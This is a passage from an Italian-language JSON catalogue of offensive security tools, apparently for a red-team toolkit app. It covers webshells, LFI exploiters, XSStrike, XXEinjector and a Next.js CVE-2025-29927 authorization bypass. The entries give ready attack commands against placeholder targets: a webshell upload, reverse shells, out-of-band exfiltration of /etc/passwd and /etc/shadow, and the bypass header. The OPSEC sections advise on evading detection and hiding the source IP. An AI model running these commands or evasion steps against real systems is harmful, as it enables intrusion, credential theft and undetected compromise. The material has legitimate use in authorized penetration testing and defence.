Exploitation</strong>, dopo aver ottenuto credenziali del Manager (spesso default come tomcat:tomcat, admin:admin, o tramite bruteforce), cmd.jsp è il payload standard per convertire l'accesso amministrativo in Remote Code Execution.</p><p>In scenari di <strong>Java Application Testing</strong>, quando si scopre una vulnerabilità di file upload in un'applicazione Java, deployare una JSP webshell è il metodo più diretto per ottenere RCE.</p><p>Per <strong>Pivoting</strong>, una volta stabilita la webshell, può essere usata per scaricare ed eseguire tool aggiuntivi, stabilire reverse shell più stabili, o enumerare la rete interna.</p><p>Durante <strong>CTF e Lab</strong>, è un payload classico per challenge che coinvolgono Tomcat misconfiguration.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I file .jsp nelle directory web sono monitorati da molte soluzioni di sicurezza. L'esecuzione di comandi shell da processi Java (java.exe/java spawna cmd.exe o sh) è un indicatore comportamentale forte rilevato da EDR. I comandi eseguiti appaiono nei log di sistema.</p><p><strong>Impatto:</strong> La webshell eredita i privilegi del processo Tomcat, tipicamente un utente di servizio con accesso limitato ma sufficiente per enumerazione e lateral movement.</p><p><strong>Mitigazioni:</strong> Utilizzare nomi file non predicibili invece di cmd.jsp. Rimuovere la shell immediatamente dopo l'uso. Considerare webshell offuscate o tecniche di memory-only execution per ambienti con monitoraggio attivo. Il traffico HTTP contenente comandi è visibile in chiaro nei log e nel traffico di rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "wwwolf-php-webshell",
    "name": "wwwolf-php-webshell",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/WhiteWinterWolf/wwwolf-php-webshell",
    "desc": "Webshell PHP 'WhiteWinterWolf' ottimizzata per stabilità, file upload e bypass restrizioni (open_basedir).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La webshell di WhiteWinterWolf (wwwolf) rappresenta l'evoluzione del concetto di webshell PHP verso la massima affidabilità e portabilità. Progettata con un focus sulla resilienza, questa shell funziona correttamente su configurazioni PHP estremamente restrittive dove altre webshell falliscono. Gestisce automaticamente le differenze tra ambienti Windows e Linux, tenta bypass intelligenti di restrizioni come <code>open_basedir</code> e <code>disable_functions</code>, e offre un'interfaccia web pulita che non richiede JavaScript per le operazioni di base.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-Platform Intelligence:</strong> Rileva automaticamente il sistema operativo e adatta i comandi di conseguenza. Su Windows utilizza <code>cmd.exe</code>, su Linux <code>/bin/sh</code>, gestendo correttamente separatori di path e variabili d'ambiente specifiche della piattaforma.</p><p><strong>Restriction Bypass:</strong> Implementa tecniche per aggirare configurazioni PHP restrittive. Tenta di resettare <code>open_basedir</code> tramite ini_set, utilizza funzioni alternative per l'esecuzione comandi (system, passthru, exec, shell_exec, popen, proc_open) testando quale sia disponibile, e gestisce correttamente ambienti con safe_mode legacy.</p><p><strong>File Manager Integrato:</strong> Include funzionalità complete di gestione file: upload via form multipart, download di file dal server, navigazione directory, visualizzazione permessi e dimensioni. Tutto accessibile tramite interfaccia HTML pura senza dipendenze JavaScript.</p><p><strong>Output Handling Robusto:</strong> Cattura correttamente sia stdout che stderr dei comandi eseguiti, mostrando errori che altre shell nascondono. Supporta output binario per download di file non testuali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La webshell è un singolo file PHP da caricare sul server target tramite vulnerabilità di file upload, LFI-to-RCE, o accesso FTP/SSH compromesso.</p><pre><code># Upload della shell sul target (es. via curl dopo aver ottenuto accesso)\ncurl -F 'file=@webshell.php' http://target.com/upload.php\n\n# Accesso via browser\nhttp://target.com/uploads/webshell.php\n\n# Esecuzione comandi dall'interfaccia web\n# Inserire comando nel campo input e premere Execute\n\n# Download file dal server\n# Navigare al file desiderato e cliccare Download</code></pre><p>La shell è configurabile: è possibile impostare una password di accesso modificando la variabile all'inizio del file per evitare accessi non autorizzati da parte di altri attaccanti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Web Application Penetration Testing</strong>, dopo aver sfruttato una vulnerabilità di upload, wwwolf fornisce un punto d'appoggio stabile per l'enumerazione del sistema, la lettura di file di configurazione e la preparazione di privilege escalation.</p><p>In scenari di <strong>Post-Exploitation</strong>, permette di trasferire tool aggiuntivi (come LinPEAS o exploit kernel) sul target senza necessità di reverse shell, utile quando le connessioni outbound sono bloccate.</p><p>Per operazioni di <strong>Red Team</strong>, la sua leggerezza e assenza di dipendenze la rendono ideale come fallback quando shell più sofisticate vengono bloccate da WAF o AV.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Come tutte le webshell, lascia un file PHP sul disco con signature riconoscibili. Scanner come ClamAV, YARA rules specifiche e soluzioni WAF (ModSecurity) possono identificarla. I log del web server registrano ogni accesso.</p><p><strong>Impatto:</strong> Una webshell esposta può essere scoperta e utilizzata da altri attaccanti. Proteggere sempre con password e utilizzare nomi file non predicibili.</p><p><strong>Mitigazioni:</strong> Eliminare la shell immediatamente dopo l'uso. Utilizzare nomi file randomizzati invece di shell.php. Considerare webshell memory-only o tecniche di offuscamento per ambienti con monitoraggio attivo. Verificare i log di accesso per attività sospette post-operazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "lfifreak",
    "name": "LFiFreak",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/OsandaMalith/LFiFreak",
    "desc": "Tool per sfruttamento automatico di vulnerabilità Local File Inclusion (LFI) con supporto per shell reverse e RCE via wrapper PHP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LFiFreak</strong> automatizza il processo spesso noioso di sfruttamento delle vulnerabilità di Local File Inclusion. Invece di testare manualmente decine di payload, il tool scansiona i parametri URL vulnerabili e tenta di trasformare una semplice lettura di file in una Remote Code Execution (RCE) completa, sfruttando wrapper PHP, log poisoning o file upload.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wrapper Abuse:</strong> Testa automaticamente wrapper come <code>php://filter</code> per leggere sorgenti PHP codificati in base64 (evitando l'esecuzione server-side) o <code>php://input</code> e <code>data://</code> per iniettare codice arbitrario se le configurazioni lo permettono.</p><p><strong>RCE Techniques:</strong> Include tecniche avanzate per ottenere una shell: iniezione nei log di Apache/SSH (Log Poisoning) per poi includerli, o accesso ai file di sessione PHP e al file system virtuale <code>/proc/self/environ</code>.</p><p><strong>Interactive Shell:</strong> Se l'exploit ha successo, fornisce un'interfaccia pseudo-shell per inviare comandi al server vittima come se si fosse in un terminale locale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 2.7 (legacy). Si avvia specificando l'URL con il parametro vulnerabile.</p><pre><code># Scansione e attacco su parametro 'page'\npython lfifreak.py --url \"http://target.com/index.php?page=FUZZ\"\n\n# Tentativo specifico di RCE via access.log\npython lfifreak.py --url \"http://target.com/vuln.php?file=\" --method logs</code></pre><p>Il tool chiederà interattivamente quali payload testare e mostrerà l'output dei comandi eseguiti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>Web Pentest</strong>, quando si individua una potenziale LFI ma i file comuni (<code>/etc/passwd</code>) non portano a nulla di interessante. LFiFreak permette di scalare rapidamente la vulnerabilità per ottenere accesso al sistema operativo sottostante.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload di path traversal (<code>../../etc/passwd</code>) sono signature classiche per qualsiasi WAF/IDS. Il log poisoning lascia tracce permanenti e visibili nei log di sistema del server.</p><p><strong>Impatto operativo:</strong> L'iniezione di codice nei log o nelle sessioni può corrompere file critici, potenzialmente causando DoS del servizio web.</p><p><strong>Mitigazioni:</strong> Usare encoding (URL, Double URL) per offuscare i payload. Verificare manualmente l'esistenza della vuln con payload innocui prima di lanciare l'automazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "lfisuite",
    "name": "LFISuite",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/D35m0nd142/LFISuite",
    "desc": "Scanner e exploiter automatico per vulnerabilità Local File Inclusion (LFI) con 50+ metodi di bypass WAF e shell upload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LFISuite e un framework automatizzato per il rilevamento e lo sfruttamento di vulnerabilita Local File Inclusion (LFI). Una LFI si verifica quando un'applicazione web include file dal filesystem del server basandosi su input utente non sanitizzato, tipicamente attraverso parametri GET come <code>?page=about.php</code>. LFISuite automatizza l'intero ciclo di attacco: dalla scoperta del parametro vulnerabile, al bypass dei filtri di sicurezza, fino all'ottenimento di una shell remota tramite tecniche avanzate come log poisoning, /proc/self/environ injection e PHP filter chain. Il tool include oltre 50 metodi di bypass WAF e supporta sia la lettura di file sensibili che l'escalation verso l'esecuzione di codice remoto.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Scanner automatico multi-metodo:</strong> Testa automaticamente decine di varianti di payload LFI contro il parametro target, includendo null byte injection (<code>%00</code>), double encoding, path truncation, PHP wrapper (<code>php://filter</code>, <code>php://input</code>) e tecniche di bypass specifiche per diverse versioni di PHP e configurazioni del web server. Ogni payload che produce una risposta diversa viene segnalato come potenzialmente vulnerabile.</p><p><strong>Exploiter con shell upload:</strong> Una volta confermata la vulnerabilita LFI, il modulo exploiter tenta di convertirla in RCE attraverso diverse tecniche: log poisoning (iniettando codice PHP nei log di Apache e poi includendoli), /proc/self/environ injection, PHP session file inclusion e data:// wrapper. Ogni tecnica viene tentata automaticamente finche una non ha successo.</p><p><strong>Reverse shell integrata:</strong> Dopo aver ottenuto l'esecuzione di codice, LFISuite puo stabilire automaticamente una reverse shell verso la macchina dell'attaccante, eliminando la necessita di tool aggiuntivi. Supporta diversi tipi di payload (PHP, Python, Perl, Bash) selezionati in base ai linguaggi disponibili sul sistema target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool offre un menu interattivo o puo essere eseguito con parametri diretti da riga di comando per l'automazione.</p><pre><code># Avvio con menu interattivo\npython3 lfisuite.py\n\n# Scansione diretta di un URL con parametro sospetto\npython3 lfisuite.py --url \"http://target.com/index.php?page=home\" --scan\n\n# Exploiter con tentativo automatico di reverse shell\npython3 lfisuite.py --url \"http://target.com/index.php?page=home\" --exploit --lhost 10.10.14.5 --lport 4444\n\n# Lettura specifica di un file\npython3 lfisuite.py --url \"http://target.com/index.php?page=home\" --read /etc/passwd</code></pre><p>Il parametro vulnerabile viene identificato automaticamente analizzando la struttura dell'URL. Se il parametro non e ovvio, e possibile specificarlo manualmente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>LFISuite e essenziale in qualsiasi web assessment dove si sospetti una vulnerabilita di file inclusion. Le LFI sono ancora sorprendentemente comuni in applicazioni PHP legacy, portali aziendali personalizzati e CMS minori. Il tool e particolarmente potente quando combinato con informazioni raccolte durante la ricognizione: sapere che il server usa Apache (log in <code>/var/log/apache2/access.log</code>) o Nginx (log in <code>/var/log/nginx/access.log</code>) permette di configurare il log poisoning in modo mirato. In ambienti enterprise, le LFI nei portali interni spesso portano alla lettura di file di configurazione contenenti credenziali database o chiavi API.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload LFI contenenti sequenze <code>../</code> e wrapper PHP sono rilevati da qualsiasi WAF con ruleset OWASP CRS. Le richieste generate sono numerose e facilmente distinguibili dal traffico legittimo. Il log poisoning lascia tracce permanenti nei file di log del web server.</p><p><strong>Impatto operativo:</strong> Tecniche aggressive come /proc/self/environ injection possono causare crash del processo web server su configurazioni particolari. Il log poisoning inquina permanentemente i file di log, rendendo evidente l'attacco durante qualsiasi analisi forense successiva. La lettura di file sensibili come /etc/shadow e registrata nei log di audit del sistema operativo.</p><p><strong>Mitigazioni:</strong> Iniziare con tecniche meno rumorose come PHP filter (base64 encode) prima di tentare il log poisoning. Limitare il numero di tentativi configurando appropriatamente il delay tra le richieste. Utilizzare un proxy per offuscare l'IP sorgente e monitorare le risposte per evitare di continuare a inviare payload dopo essere stati bloccati dal WAF.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "liffy",
    "name": "liffy",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/mzfr/liffy",
    "desc": "Tool moderno per LFI exploitation che sfrutta wrapper PHP (data://, input://, filter://) per data extraction e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Liffy</strong> è uno strumento specializzato nello sfruttamento avanzato delle vulnerabilità Local File Inclusion (LFI) in applicazioni PHP. La sua forza sta nell'automazione dei PHP wrapper attacks: utilizza <code>php://filter</code> per estrarre codice sorgente in base64 (evitando l'esecuzione), <code>data://</code> e <code>input://</code> per ottenere Remote Code Execution (RCE), e tecniche avanzate di filter chaining per bypassare filtri di input. È più mirato e sofisticato di tool generici come LFISuite.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PHP Filter Wrapper Exploitation:</strong> Automatizza l'uso di <code>php://filter/convert.base64-encode/resource=</code> per leggere file PHP senza eseguirli. Il contenuto viene restituito codificato in base64, rivelando credenziali hardcoded, logica di business, e altre vulnerabilità nel codice sorgente.</p><p><strong>Filter Chain Bypass:</strong> Genera catene di filtri PHP complesse per bypassare WAF e filtri di input che bloccano caratteri specifici. Usa tecniche come rot13, string.strip_tags, e convert.iconv per costruire payload che evadono i controlli.</p><p><strong>Data Wrapper RCE:</strong> Quando <code>allow_url_include</code> è abilitato, sfrutta <code>data://text/plain;base64,</code> per iniettare ed eseguire codice PHP arbitrario, trasformando una LFI in RCE completa.</p><p><strong>Interactive Pseudo-Shell:</strong> Dopo aver stabilito l'esecuzione di codice, fornisce una shell interattiva per eseguire comandi sul server target senza dover crafting manuale di ogni payload.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Liffy è uno script Python 3 con interfaccia CLI. Il parametro FUZZ indica dove inserire il payload.</p><pre><code># Leggi codice sorgente di un file PHP\npython3 liffy.py -u \"http://target.com/index.php?page=FUZZ\" --data /var/www/html/config.php\n\n# Tentativo RCE con shell interattiva\npython3 liffy.py -u \"http://target.com/vuln.php?file=FUZZ\" --shell\n\n# Specifica wrapper da usare\npython3 liffy.py -u \"http://target.com/?inc=FUZZ\" --data /etc/passwd --wrapper filter\n\n# Dump multipli file\npython3 liffy.py -u \"http://target.com/?page=FUZZ\" --data /var/www/html/index.php,/var/www/html/db.php\n\n# Con cookie di sessione\npython3 liffy.py -u \"http://target.com/?page=FUZZ\" --data /etc/passwd --cookie \"PHPSESSID=abc123\"</code></pre><p>L'output base64 dei file estratti viene automaticamente decodificato e mostrato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>CTF</strong>, le LFI sono vulnerabilità comuni. Liffy permette di estrarre rapidamente file chiave come config.php, flag.txt, o credenziali database senza trial-and-error manuale.</p><p>Nel <strong>Web Application Penetration Testing</strong>, dopo aver identificato una LFI, Liffy automatizza l'escalation verso la lettura di file sensibili e potenzialmente RCE.</p><p>Per <strong>Code Audit</strong>, estrarre il codice sorgente di un'applicazione PHP vulnerabile permette di identificare altre vulnerabilità (SQLi, auth bypass) nel codice stesso.</p><p>In scenari di <strong>Bug Bounty</strong>, dimostrare l'impatto di una LFI leggendo /etc/passwd o file di configurazione aumenta la severity del report.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload contenenti php://filter e data:// sono signature note per WAF. Le richieste con path traversal (../) e wrapper PHP nei parametri generano alert su sistemi di sicurezza moderni.</p><p><strong>Prerequisiti:</strong> Le tecniche RCE richiedono <code>allow_url_include=On</code> in php.ini, configurazione rara su sistemi moderni. La lettura file con filter wrapper funziona in più scenari.</p><p><strong>Impatto:</strong> L'estrazione di codice sorgente può rivelare informazioni sensibili. L'RCE fornisce controllo completo del server web.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "xsstrike-3-1-6",
    "name": "XSStrike",
    "version": "3.1.6",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/s0md3v/XSStrike",
    "desc": "Suite avanzata per rilevamento XSS con analisi del contesto, fuzzing intelligente e generazione payload (non solo regex).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XSStrike e la suite piu avanzata disponibile per il rilevamento e lo sfruttamento di vulnerabilita Cross-Site Scripting (XSS). A differenza degli scanner tradizionali che si limitano a iniettare una lista predefinita di payload e verificare se vengono riflessi nella risposta, XSStrike utilizza un approccio basato sull'analisi del contesto HTML. Il tool effettua il parsing del DOM della pagina per determinare esattamente dove l'input dell'utente viene inserito (dentro un tag, un attributo, un blocco JavaScript, un commento HTML) e genera payload specifici per quel contesto, massimizzando la probabilita di successo. Include inoltre un fuzzer intelligente, un crawler per la scoperta automatica di parametri riflessi e un motore di generazione payload che combina tecniche di evasione WAF.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Analisi contestuale del DOM:</strong> XSStrike analizza la struttura HTML della risposta per identificare il contesto esatto in cui l'input viene riflesso. Se l'input appare dentro un attributo <code>value=\"\"</code>, genera payload che chiudono l'attributo e il tag. Se appare dentro un blocco <code>&lt;script&gt;</code>, genera payload JavaScript validi. Questa analisi contestuale riduce drasticamente i falsi positivi e aumenta il tasso di successo rispetto al bruteforce cieco di payload.</p><p><strong>Fuzzer intelligente con WAF evasion:</strong> Il modulo fuzzer testa sistematicamente quali caratteri e keyword vengono filtrati o encodati dall'applicazione, costruendo una mappa delle restrizioni. Basandosi su questa mappa, il motore di generazione payload crea vettori XSS che utilizzano solo caratteri e costrutti non filtrati, aggirando efficacemente filtri custom e WAF con regole specifiche.</p><p><strong>Crawler e discovery automatica:</strong> Include un modulo crawler che naviga il sito target identificando automaticamente tutti i parametri che riflettono l'input dell'utente nella risposta HTTP. Per ogni parametro trovato, esegue l'analisi contestuale e il tentativo di exploit, permettendo la scansione completa di un'applicazione con un singolo comando.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>XSStrike si utilizza da riga di comando specificando l'URL target con il parametro da testare. Supporta diverse modalita operative.</p><pre><code># Test singolo parametro con analisi contestuale\npython3 xsstrike.py -u \"http://target.com/search?q=test\"\n\n# Crawling del sito con test automatico di tutti i parametri\npython3 xsstrike.py -u \"http://target.com\" --crawl -l 3\n\n# Fuzzing per mappare i filtri dell'applicazione\npython3 xsstrike.py -u \"http://target.com/search?q=test\" --fuzzer\n\n# Test su richieste POST con dati form\npython3 xsstrike.py -u \"http://target.com/contact\" --data \"name=test&message=test\" --method POST</code></pre><p>Per applicazioni protette da WAF, si consiglia di eseguire prima il fuzzer per comprendere le restrizioni e poi lasciare che il motore di generazione payload crei vettori di bypass specifici.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>XSStrike e il tool di riferimento per qualsiasi web assessment che includa il testing di vulnerabilita XSS. E particolarmente efficace contro applicazioni con filtri custom di input sanitization dove scanner generici come Burp falliscono, poiche il suo approccio contestuale permette di identificare bypass specifici. In scenari red team, un XSS stored puo essere utilizzato per il phishing mirato (inserendo un form di login falso in una pagina legittima), per il furto di sessioni amministrative o per il delivery di payload malware attraverso pagine web fidate dall'organizzazione target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste contenenti payload XSS (<code>&lt;script&gt;</code>, <code>onerror</code>, <code>javascript:</code>) sono rilevate da qualsiasi WAF e IDS. Il crawling automatico genera un volume di traffico significativo. I payload di test che vengono riflessi nelle pagine possono essere visibili agli utenti legittimi del sito.</p><p><strong>Impatto operativo:</strong> I payload XSS stored rimangono permanentemente nel database dell'applicazione e sono visibili a tutti gli utenti fino alla rimozione manuale. In applicazioni di produzione, un payload mal configurato puo causare errori di rendering o loop di redirect per tutti i visitatori della pagina.</p><p><strong>Mitigazioni:</strong> Utilizzare payload di test benigni (alert con identificatore univoco) invece di payload distruttivi. In ambienti di produzione, preferire Reflected XSS per la dimostrazione poiche non persiste. Coordinare con il cliente la finestra temporale del test e avere un piano di rollback per rimuovere rapidamente eventuali payload stored problematici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "xxeinjector",
    "name": "XXEinjector",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/enjoiz/XXEinjector",
    "desc": "Tool automatico per sfruttare vulnerabilità XXE (XML External Entity): estrazione file (OOB), enumerazione porte e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XXEinjector e un tool automatizzato scritto in Ruby per lo sfruttamento di vulnerabilita XML External Entity (XXE) Injection. Le vulnerabilita XXE si verificano quando un'applicazione web processa input XML senza disabilitare il caricamento di entita esterne, permettendo a un attaccante di definire entita che referenziano risorse del filesystem locale, URL interni o servizi di rete. XXEinjector automatizza sia l'estrazione di file dal server (in banda e fuori banda tramite tecniche Out-of-Band/OOB), sia l'enumerazione delle porte interne della rete tramite Server-Side Request Forgery (SSRF), sia in alcuni casi l'esecuzione di codice remoto attraverso il protocollo expect:// di PHP. Il tool gestisce automaticamente la codifica dei payload e l'hosting del server DTD esterno necessario per le tecniche OOB.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione file Out-of-Band (OOB):</strong> Quando l'applicazione non riflette il contenuto dell'entita nella risposta HTTP (blind XXE), XXEinjector utilizza la tecnica OOB: definisce un'entita che carica un DTD esterno dal server dell'attaccante, il quale a sua volta istruisce il parser XML a inviare il contenuto del file target come parametro di una richiesta HTTP verso il server controllato dall'attaccante. Questo permette l'estrazione di file anche quando la risposta dell'applicazione non mostra errori o output.</p><p><strong>Enumerazione porte interne (SSRF):</strong> Sfruttando le entita esterne con protocollo HTTP, il tool puo istruire il server target a effettuare richieste verso indirizzi IP interni su porte specifiche. Analizzando i tempi di risposta e gli errori, XXEinjector mappa i servizi attivi sulla rete interna non raggiungibile direttamente dall'attaccante, trasformando la XXE in un potente scanner di rete interno.</p><p><strong>Supporto multi-protocollo:</strong> Supporta diversi protocolli per l'estrazione dei dati: <code>file://</code> per la lettura di file locali, <code>http://</code> per SSRF, <code>ftp://</code> per l'esfiltrazione di file multilinea (che il protocollo HTTP non gestisce bene), <code>gopher://</code> per l'interazione con servizi interni e <code>expect://</code> per l'esecuzione di comandi su server PHP con l'estensione expect abilitata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>XXEinjector richiede Ruby e un file contenente la richiesta HTTP originale con il punto di iniezione XML. Il tool avvia automaticamente un server HTTP/FTP locale per ricevere i dati esfiltrati.</p><pre><code># Estrazione di /etc/passwd tramite OOB\nruby XXEinjector.rb --host=10.10.14.5 --file=/etc/passwd --httpport=8080 --oob=http --phpfilter\n\n# Enumerazione porte interne (SSRF)\nruby XXEinjector.rb --host=10.10.14.5 --file=request.txt --enumports=80,443,8080,3306 --oob=http\n\n# Estrazione file con FTP OOB (per file multilinea)\nruby XXEinjector.rb --host=10.10.14.5 --file=request.txt --path=/etc/shadow --oob=ftp --ftpport=2121</code></pre><p>Il file request.txt deve contenere la richiesta HTTP completa con il marker XXEINJECT nel punto dove inserire il payload XML. Il tool sostituisce automaticamente il marker con il payload appropriato per ogni tecnica.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>XXEinjector e indispensabile quando si identifica un endpoint che accetta XML (API SOAP, import di file XML/XLSX/DOCX, feed RSS) e si sospetta una vulnerabilita XXE. Le XXE sono particolarmente comuni in applicazioni enterprise Java (parser SAX/DOM non configurati correttamente) e in servizi legacy che processano documenti Office o SVG. In scenari red team, una XXE puo essere il vettore iniziale per accedere alla rete interna: leggendo file di configurazione si ottengono credenziali, e tramite SSRF si raggiungono servizi interni come database, pannelli di amministrazione o endpoint cloud metadata (169.254.169.254).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload XXE contenenti dichiarazioni DOCTYPE e ENTITY sono rilevati da WAF con regole specifiche. Le connessioni OOB dal server target verso l'IP dell'attaccante sono visibili nei log di rete e possono attivare alert su firewall e sistemi di threat intelligence. L'hosting di un server DTD esterno richiede un IP pubblico associabile all'attaccante.</p><p><strong>Impatto operativo:</strong> L'estrazione di file di grandi dimensioni puo causare timeout e consumo di memoria elevato nel parser XML del server. Richieste XXE malformate possono causare crash dell'applicazione o del parser XML, risultando in un Denial of Service non intenzionale. L'enumerazione porte SSRF genera traffico anomalo nella rete interna che puo attivare sistemi di rilevamento laterale.</p><p><strong>Mitigazioni:</strong> Utilizzare un server temporaneo (VPS disposable) per l'hosting del DTD e la ricezione dei dati OOB. Limitare l'estrazione ai soli file strettamente necessari per l'assessment. Testare prima con file piccoli e non sensibili per verificare la stabilita del parser prima di tentare estrazioni piu complesse.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XXE"
    ],
    "notes": null
  },
  {
    "id": "poc-cve-2025-29927",
    "name": "PoC CVE-2025-29927",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Exploit per bypass autorizzazione middleware in Next.js tramite manipolazione header (x-middleware-subrequest).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo Proof of Concept sfrutta la CVE-2025-29927, una vulnerabilita critica di bypass dell'autorizzazione nel framework Next.js. La falla risiede nel modo in cui Next.js gestisce internamente le richieste che attraversano il middleware di autorizzazione: il framework utilizza un header HTTP interno chiamato <code>x-middleware-subrequest</code> per tracciare le sotto-richieste generate dal middleware stesso ed evitare loop infiniti. Un attaccante puo semplicemente aggiungere questo header alla propria richiesta HTTP, facendo credere al framework che la richiesta sia gia stata processata dal middleware e bypassando completamente qualsiasi logica di autenticazione o autorizzazione implementata nel middleware layer. La gravita di questa vulnerabilita e amplificata dal fatto che Next.js e uno dei framework web piu diffusi al mondo e il middleware e il metodo raccomandato per implementare l'autenticazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Bypass middleware con header injection:</strong> L'exploit consiste nell'aggiungere l'header <code>x-middleware-subrequest</code> con un valore specifico (tipicamente il path del file middleware, come <code>middleware:middleware</code> o <code>src/middleware:src/middleware</code>) alla richiesta HTTP. Next.js interpreta questa richiesta come una sotto-richiesta interna gia autorizzata, saltando completamente l'esecuzione del middleware e servendo direttamente il contenuto della pagina protetta.</p><p><strong>Compatibilita multi-versione:</strong> Il valore esatto dell'header varia tra le versioni di Next.js. Il PoC include logica per determinare automaticamente il formato corretto testando diverse varianti del valore dell'header. Le versioni vulnerabili includono Next.js dalla 11.1.4 alla 15.2.2 (prima del fix), coprendo anni di deployment in produzione.</p><p><strong>Automazione della verifica:</strong> Lo script automatizza il processo di verifica testando l'accesso a pagine protette (come <code>/admin</code>, <code>/dashboard</code>, <code>/api/admin</code>) prima senza l'header (per confermare che l'autenticazione e attiva) e poi con l'header (per confermare il bypass), fornendo una dimostrazione chiara e inequivocabile della vulnerabilita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'exploit puo essere eseguito con un semplice comando curl o tramite lo script Python del PoC per testing automatizzato.</p><pre><code># Bypass manuale con curl - formato Next.js 14+\ncurl -H \"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\" http://target.com/admin\n\n# Bypass per Next.js con middleware in src/\ncurl -H \"x-middleware-subrequest: src/middleware:src/middleware:src/middleware\" http://target.com/dashboard\n\n# Esecuzione PoC automatizzato\npython3 poc.py -u http://target.com -p /admin,/dashboard,/api/users\n\n# Verifica con Burp Repeater (aggiungere header manualmente)\nGET /admin HTTP/1.1\nHost: target.com\nx-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code></pre><p>La verifica piu affidabile consiste nel confrontare la risposta HTTP (status code e body) con e senza l'header su un endpoint notoriamente protetto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Questa vulnerabilita e devastante in scenari reali perche Next.js e utilizzato da migliaia di applicazioni web enterprise per dashboard amministrative, portali clienti e API backend. Un attaccante puo accedere a pannelli di amministrazione, endpoint API protetti e dati sensibili senza alcuna credenziale. In contesti red team, questa CVE rappresenta spesso un vettore di accesso iniziale estremamente efficace: molte applicazioni Next.js in produzione non sono state aggiornate tempestivamente e il middleware e l'unico layer di autenticazione. L'exploit e talmente semplice (un singolo header HTTP) che puo essere eseguito anche manualmente con curl durante una ricognizione rapida.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I WAF moderni hanno aggiunto regole specifiche per bloccare richieste contenenti l'header <code>x-middleware-subrequest</code> proveniente da client esterni. I log del web server registrano gli header della richiesta, rendendo l'attacco facilmente identificabile in fase forense. Next.js nelle versioni patchate logga esplicitamente i tentativi di bypass.</p><p><strong>Impatto operativo:</strong> L'exploit e puramente passivo dal punto di vista del server: non modifica dati, non causa crash e non altera lo stato dell'applicazione. Tuttavia, l'accesso non autorizzato a dashboard amministrative potrebbe esporre dati sensibili di 